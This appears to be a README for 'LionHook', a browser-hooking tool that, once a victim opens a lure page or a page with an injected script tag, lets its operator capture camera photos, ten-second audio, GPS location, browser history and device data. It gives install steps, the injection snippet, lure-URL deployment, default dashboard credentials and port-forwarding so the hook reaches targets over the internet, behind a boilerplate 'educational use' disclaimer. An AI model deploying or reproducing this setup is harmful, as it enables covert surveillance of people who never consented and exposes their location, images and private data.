# LionHook
𝙇𝙄𝙊𝙉𝙃𝙊𝙊𝙆 𝘼 𝘽𝙍𝙊𝙒𝙎𝙀𝙍 𝙀𝙓𝙋𝙇𝙊𝙄𝙏𝘼𝙏𝙄𝙊𝙉 𝙁𝙍𝘼𝙈𝙀𝙒𝙊𝙍𝙆 𝙁𝙊𝙍 𝙏𝙀𝙍𝙈𝙐𝙓/𝙇𝙄𝙉𝙐𝙓/𝙒𝙄𝙉𝘿𝙊𝙒 𝙐𝙎𝙀𝙍

     ╔═══════════════╗
     ║𝙐𝙉𝙀𝙈𝙋𝙇𝙊𝙄𝘿-𝙃𝘼𝘾𝙆𝙀𝙍║    
     ╚═══════════════╝


     
     
            𝙇𝙄𝙊𝙉𝙃𝙊𝙊𝙆   
     
     ╠═════════════════╣

# 𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙄𝙉𝙂 𝙇𝙄𝙊𝙉𝙃𝙊𝙊𝙆 𝙁𝙍𝘼𝙈𝙀𝙒𝙊𝙍𝙆


➢  𝙀𝙑𝙀𝙍𝙔𝙏𝙃𝙄𝙉𝙂 𝘼𝘽𝙊𝙐𝙏 𝙁𝙍𝘼𝙈𝙀𝙒𝙊𝙍𝙆



![LionHook Logo](https://img.shields.io/badge/LionHook-V1-orange)
![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Cross--Platform-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

## 📖 Overview

LionHook is an advanced penetration testing tool designed for educational purposes and authorized security testing. It provides a comprehensive framework for device control, data collection, and real-time monitoring with a professional 3D interface.

**Developer:** [@Akhand_Aryavart](https://t.me/Akhand_Aryavart)

## ⚡ Features

- 🎯 **Advanced 3D Dashboard** - Professional interface with real-time statistics
- 🔗 **Hook Generation** - Create custom hooks for device penetration testing
- 📍 **Location Tracking** - GPS and IP-based location collection
- 📷 **Camera Access** - Front and back camera photo capture
- 🎤 **Audio Recording** - 10-second audio recording capability
- 🔋 **System Information** - Battery, network, and device info collection
- 📊 **Data Gallery** - Organized storage and viewing of collected data
- 🔐 **HTTPS Security** - Encrypted connections with SSL/TLS
- 🌐 **Cross-Platform** - Works on Termux, Linux, Windows, and macOS

## 🚀 Quick Installation

### Method 1: Automated Installer
```bash
# Download and run installer
chmod +x install.sh
./install.sh
```

Method 2: Manual Installation

```bash
# Install dependencies
python3 -m pip install flask flask-sslify pyopenssl

# Generate SSL certificate
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365 -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"

# Create directories
mkdir -p templates static data/devices
```

🎯 Usage Guide

Set File Permissions :

```bash
chmod +x  start_termux.sh start_linux.sh start_macos.sh
```

Platform-wise Usage:

Termux:

```bash
./start_termux.sh
```

Linux:

```bash
./start_linux.sh
```

macOS:

```bash
./start_macos.sh
```

Windows:

```bat
window.bat
```


Access Points

· Dashboard: https://localhost:5000/dashboard
· Login: https://localhost:5000/login
· Settings: https://localhost:5000/settings
· Data Gallery: https://localhost:5000/gallery

Default Credentials

· Username: ONDORK
· Password: ONDORK

Basic Workflow

1. Start the server using the startup script
2. Login to the dashboard with default credentials
3. Generate a hook from the dashboard
4. Deploy the hook by embedding the script tag or using the demo URL
5. Monitor connected devices in real-time
6. Send commands to connected devices
7. View collected data in the gallery

📡 WAN Access Setup

⚠️ IMPORTANT: For External Access

To access LionHook from other devices on your network or over the internet:

1. Port Forwarding (Required for WAN)

```bash
# You MUST forward port 5000 on your router
# Access will be: https://YOUR_PUBLIC_IP:5000
```

2. Router Configuration

· Access your router admin panel (usually 192.168.1.1)

· Find "Port Forwarding" or "Virtual Servers" section

· Add rule: External Port 5000 → Internal Port 5000 → Your Local IP

· Protocol: TCP


3. Firewall Configuration
   

```bash
# Linux/macOS
sudo ufw allow 5000/tcp

# Windows
# Allow through Windows Defender Firewall
```

4. Access URLs with WAN

· Local Network: https://[YOUR_LOCAL_IP]:5000
· Internet: https://[YOUR_PUBLIC_IP]:5000

🛠️ Platform-Specific Guides

📱 Termux (Android)

```bash
pkg update && pkg upgrade
pkg install python openssl-tool
./install.sh
./start.sh
```

🐧 Linux (Debian/Ubuntu)

```bash
sudo apt update && sudo apt upgrade
sudo apt install python3 python3-pip openssl
./install.sh
./start.sh
```

🪟 Windows

1. Install Python from python.org
2. Install OpenSSL from slproweb.com
3. Run install.sh in Git Bash or WSL
4. Use start.bat to launch

🍎 macOS

```bash
brew install python3 openssl
./install.sh
./start.sh
```

🔧 Advanced Features

Hook Deployment Methods

1. Script Tag Injection

```html
<script src="https://your-server.com/hook/YOUR_HOOK_ID"></script>
```

2. Demo Page

```html
https://your-server.com/demo/YOUR_HOOK_ID
```

3. Direct Hook

```html
https://your-server.com/hook/YOUR_HOOK_ID
```

Available Commands

1· 📍 Get Location - GPS and IP-based location

2· 📷 Front/Back Camera - Photo capture

3· 🎤 Record Audio - 10-second recording

4· 🔋 Battery Info - Battery status and level

5· 📡 Network Info - Connection details

6· 💻 System Info - Device specifications

7· 📚 Browser History - Navigation data

🗂️ File Structure

```
lionhook/
├── install.sh
├── lionhook.db
├── main.py
├── requirements.txt
├── static
│   ├── script.js
│  └── style.css
├── data
│   └── devices
└── templates
    ├── dashboard.html
    ├── demo.html
    ├── device_gallery.html
    ├── gallery.html
    ├── hook.js
    ├── index.html
    ├── login.html
    └── settings.html
```

⚠️ Legal Disclaimer

LionHook is developed for:

· Educational purposes
· Authorized penetration testing
· Security research
· Ethical hacking training

Prohibited uses:


· Unauthorized access to systems

· Illegal surveillance

· Malicious activities

· Privacy violations


Users are solely responsible for:

· Obtaining proper authorization

· Complying with local laws

· Ethical usage of the tool


🐛 Troubleshooting

Common Issues


1. Port 5000 not accessible
   · Check firewall settings
   · Verify port forwarding
   · Ensure no other service uses port 5000

2. SSL certificate errors

   · Regenerate certificates: rm cert.pem key.pem && ./start.sh

    · Accept self-signed certificate in browser

4. Dependencies issues

    · Reinstall: pip3 install -r requirements.txt
 
   · Update Python: python3 -m pip install --upgrade pip

6. Hook not working

    · Check browser console for errors
 
   · Verify HTTPS connection
 
   · Ensure device has internet access

Logs & Debugging


· Check terminal output for server logs

· Browser Developer Tools for client-side issues

· Data stored in data/devices/ directory

🤝 Support
➢ 𝙎𝙋𝙀𝘾𝙄𝘼𝙇 𝙏𝙃𝘼𝙉𝙆𝙎 - [𝙏𝙊𝙕𝙄 𝙎𝙄𝙍](https://t.me/Nexaq)

       ╔═════════════════╗
       ║    𝙁𝙊𝙐𝙉𝘿 𝙐𝙎𝙀      ║
       ║۞𝘼𝙆𝙃𝘼𝙉𝘿 𝘼𝙍𝙔𝘼𝙑𝘼𝙍𝙏۞ ║
       ╚═════════════════╝

[𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈](https://t.me/Akhand_aryavart) [𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈](https://www.instagram.com/unemploid_hacker?igsh=MWRyeWd4Z2JjdnN3aQ==) [𝙂𝙄𝙏𝙃𝙐𝘽](https://github.com/UNEMPLOYEDHACKER)

